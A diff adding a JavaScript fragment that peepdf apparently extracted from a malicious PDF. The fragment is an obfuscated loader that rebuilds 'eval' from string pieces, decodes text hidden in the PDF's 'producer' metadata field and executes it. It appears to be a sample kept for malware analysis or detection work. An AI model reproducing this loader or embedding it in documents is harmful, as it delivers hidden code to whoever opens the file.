@@ -1,0 +1,15 @@
+// peepdf comment: Javascript code located in object 3332 (version 0)
+
+ fsd = (function() {
+     return this;
+ }).call(null);
+ var fu = '';
+ var djfw = 'e' + 'va' + 'l';
+ ugc = fsd[djfw];
+ ugc('va' + fu + 'r hf=th' + fu + 'i' + fu + 's');
+ var ci = 'producer';
+ var pboa = hf[ci];
+ ugc('va' + fu + 'r tfow=Str' + fu + 'ing.f' + fu + 'romC' + fu + 'harCode');
+ hK = 'var ffl = pboa.replace(/&/g,tfow(0x1E+0x0+7));s = unescape(ffl);ugc(s);';
+ ugc(hK);
+
